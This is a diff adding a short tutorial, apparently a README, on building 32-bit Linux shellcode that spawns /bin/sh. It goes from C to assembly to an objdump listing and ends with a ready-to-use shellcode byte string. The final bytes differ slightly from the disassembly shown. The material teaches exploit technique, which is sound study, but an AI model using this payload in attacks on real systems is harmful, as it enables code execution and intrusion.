@@ -1,0 +1,58 @@
+Mar 13, 2012 
+
+Shellcode is a kind of technique that contains beauty and elegant of
+design. You can see the nature beautiful things in machines. Perhaps,
+this is one of the nearest place to machine that software hacker would
+reaches. Stay out there and feels that beautiful inside of the coding
+world.
+
+This is a great article if you wish learn more:
+http://www.phiral.net/shellcode.htm
+
+This code is tested on slackware 13.x. First, you need to compile these 3 files:
+
+root@sl13:/home/shell# make
+gcc -g -o c_sh c_sh.c
+as -o asm_sh.o asm_sh.s
+ld -o asm_sh asm_sh.o
+ld: warning: cannot find entry symbol _start; defaulting to 0000000008048054
+gcc -g -o opcode_sh opcode_sh.c
+done
+
+c_sh: The C implementation of spawn a shell.
+asm_sh: ASM implementation of spawn a shell.
+opcode_sh: machine code
+
+Normally, write a shellcode could have a few steps:
+
+1, Write the program you want in C. Like as, c_sh.c
+
+2, Learn the information from gdb's dissambler or "gcc -S". Then,
+write a assembly one to achieve the same function in C.
+
+3, Dig out the op-code of your binary program. And, write the
+shellcode.
+
+root@sl13:/home/shell# objdump -d asm_sh
+
+asm_sh:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048054 <_start>:
+ 8048054:	31 d2			xor    %edx,%edx
+ 8048056:	52                   	push   %edx
+ 8048057:	68 6e 2f 73 68       	push   $0x68732f6e
+ 804805c:	68 2f 2f 62 69       	push   $0x69622f2f
+ 8048061:	89 e3                	mov    %esp,%ebx
+ 8048063:	52                   	push   %edx
+ 8048064:	53                   	push   %ebx
+ 8048065:	89 e1                	mov    %esp,%ecx
+ 8048067:	b0 0b                	mov    $0xb,%al
+ 8048069:	cd 80                	int    $0x80
+
+Finally, you got the shellcode of spawn a shell:
+char shell[] = "\x31\xd2\x52\x68\x6e\x2f\x73\x68"
+     "\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"; 
+
